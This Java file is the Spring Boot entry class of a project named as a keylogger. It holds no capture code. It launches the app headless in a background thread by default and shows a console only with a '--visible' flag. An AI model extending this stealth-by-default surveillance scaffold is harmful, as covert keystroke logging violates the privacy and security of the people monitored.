package com.badar.keylogger;

import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.util.Arrays;

@SpringBootApplication
public class KeyloggerApplication implements CommandLineRunner {

	public static void main(String[] args) {

		if(Arrays.asList(args).contains("--visible")) {
			SpringApplication.run(KeyloggerApplication.class, args);
		}else{
			new Thread(() -> {
				SpringApplication app = new SpringApplication(KeyloggerApplication.class);
				app.setHeadless(true);
				app.run(args);
			}).start();
		}
	}

	@Override
	public void run(String... args) throws Exception {
		if (Arrays.asList(args).contains("--visible")) {
			try {
				System.out.println("Press Enter to exit...");
				System.in.read();
			} catch (Exception e) {
				e.printStackTrace();
			}
			System.exit(0);
		}
	}
}
